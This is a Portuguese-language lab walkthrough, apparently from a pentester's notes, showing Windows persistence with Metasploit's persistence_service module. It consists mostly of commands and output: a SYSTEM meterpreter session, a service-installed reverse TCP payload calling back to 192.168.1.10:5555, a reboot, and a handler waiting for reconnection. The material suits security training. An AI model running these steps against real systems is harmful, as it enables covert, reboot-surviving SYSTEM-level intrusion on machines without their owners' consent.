# Persistência

Objetivo: **garantir que o atacante (no caso, o pentester)** consiga **retomar o acesso ao sistema comprometido mesmo após um reboot, logoff do usuário ou encerramento da sessão inicial**.

## Procura e seleção do exploit
```
msf > search persistence -S windows

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                       ---------------  ----       -----  -----------
   1   exploit/windows/local/ps_wmi_exec                          2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   9   exploit/windows/local/linqpad_deserialization_persistence  2024-12-03       normal     Yes    LINQPad Deserialization Exploit
   24    \_ target: Windows                                       .                .          .      .
   25  exploit/windows/local/vss_persistence                      2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   28  post/windows/manage/sshkey_persistence                     .                good       No     SSH Key Persistence
   36  post/windows/manage/sticky_keys                            .                normal     No     Sticky Keys Persistence Module
   39  exploit/windows/local/wmi_persistence                      2017-06-06       normal     No     WMI Event Subscription Persistence
   40  post/windows/gather/enum_ad_managedby_groups               .                normal     No     Windows Gather Active Directory Managed Groups
   41  post/windows/manage/persistence_exe                        .                normal     No     Windows Manage Persistent EXE Payload Installer
   42  exploit/windows/local/s4u_persistence                      2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   43  exploit/windows/local/persistence                          2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   44  exploit/windows/local/persistence_service                  2018-10-20       excellent  No     Windows Persistent Service Installer
   45  exploit/windows/local/registry_persistence                 2015-07-01       excellent  Yes    Windows Registry Only Persistence
   46  exploit/windows/local/persistence_image_exec_options       2008-06-28       excellent  No     Windows Silent Process Exit Persistence


Interact with a module by name or index. For example info 51, use 51 or use exploit/linux/local/motd_persistence
```
Neste exemplo iremos usar o **exploit/windows/local/persistence_service**

> Description:
>  This Module will generate and upload an executable to a remote host, next will make it a persistent service.
>  It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
```
msf > use exploit/windows/local/persistence_service
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
## Configuração
```
msf exploit(windows/local/persistence_service) > show options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as defa
                                                   ult.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp d
                                                   irectory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 s
                                                   econds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as
                                                   default.
   SERVICE_NAME                          no        The name of service. Random string as default
                                                   .
   SESSION                               yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows
```
Verificando a sessão aberta com privilégio system (requisito)
```
msf exploit(windows/local/persistence_service) > show sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN10-  192.168.1.10:5555 -> 192.168.
                                     22H2                          1.41:49778 (192.168.1.41)
```
Engajando a sessão
```
msf exploit(windows/local/persistence_service) > set SESSION 2
SESSION => 2
```
A porta de comunicação é a 5555 (ver 02 - Escalando privilégio). É preciso alterá-la
```
msf exploit(windows/local/persistence_service) > set LPORT 5555
LPORT => 5555
```
## Execução
```
msf exploit(windows/local/persistence_service) > run
[*] Started reverse TCP handler on 192.168.1.10:5555 
[*] Running module against WIN10-22H2
[+] Meterpreter service exe written to C:\Users\user\AppData\Local\Temp\qmkgqXB.exe
[*] Creating service sTdgb
[*] Cleanup Meterpreter RC File: /home/OpsShadow/.msf4/logs/persistence/WIN10-22H2_20250904.3035/WIN10-22H2_20250904.3035.rc
[*] Sending stage (177734 bytes) to 192.168.1.41
[*] Meterpreter session 3 opened (192.168.1.10:5555 -> 192.168.1.41:49797) at 2025-09-04 20:30:38 -0300
```
Aberta a sessão 3 no meterpreter. Caso o sistema alvo seja reinicializado, poderemos reconectar diretamente a conta SYSTEM.
```
msf exploit(windows/local/persistence_service) > show sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN10-  192.168.1.10:5555 -> 192.168.
                                     22H2                          1.41:49778 (192.168.1.41)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN10-  192.168.1.10:5555 -> 192.168.
                                     22H2                          1.41:49797 (192.168.1.41)
```
Executando um reboot da máquina alvo:
```
meterpreter > reboot
Rebooting...
meterpreter > [*] 192.168.1.41 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.1.41 - Meterpreter session 3 closed.  Reason: Died
```
```
msf exploit(windows/local/persistence_service) > show sessions

Active sessions
===============

No active sessions.
```
Nenhuma sessão ativa, uma vez que a máquina desligou...

Contudo, com a execução do listenner, quando a máquina alvo se reiniciar, teremos acesso com privilégio SYSTEM.
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:5555 


